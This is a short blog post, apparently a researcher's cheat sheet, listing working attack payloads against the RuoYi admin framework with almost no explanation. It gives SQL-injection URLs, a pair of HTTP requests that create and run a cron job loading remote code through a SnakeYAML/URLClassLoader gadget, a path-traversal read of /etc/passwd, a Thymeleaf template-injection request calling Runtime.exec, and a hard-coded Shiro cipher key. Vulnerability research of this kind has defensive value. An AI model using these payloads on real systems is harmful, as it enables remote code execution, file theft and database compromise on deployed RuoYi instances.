---
layout: post
title: "::若依:: vulnerability summary"
date: 2022-10-08 17:00:43+800
toc: true
wrench: 2024-04-29
author: Bin4xin
categories:
- blog
tags:
- CVE
- 信息搜集
- vulnerability
---

## SQL inject

### sqli-1
```
/prod-api/system/user/list?pageSize=&params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))
```

### sqli-2

```
/prod-api/system/role/list?params%5bdataScope%5d=and+extractvalue(1,concat(0x7e,(select+database()),0x7e))
```

## CRON job RCE

### create 

```
POST /prod-api/monitor/job HTTP/1.1
Host: ***
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8

{"jobName":"123","jobGroup":"DEFAULT","invokeTarget":"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://host/\"]]]]')","cronExpression":"0/20 * * * * ?","misfirePolicy":1,"concurrent":"0","status":"0"}
```

### list

```
/prod-api/monitor/job/list
```

### run 

```
PUT /prod-api/monitor/job/run HTTP/1.1
Host: ***
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8

{"jobId":8,"jobGroup":"DEFAULT"}
```

## local file read

```
/common/download/resource?resource=/profile/../../../../etc/passwd
```

## thymeleaf SSTI RCE

```
POST /monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x
```

```
POST /prod-api/monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x
```

## Shiro

`CipherKey=fCq+/xW488hMTCD+cmJ3aQ==`

## ref

- [RuoYi若依](https://github.com/ax1sX/SecurityList/blob/main/Java_OA/RuoYi.md)
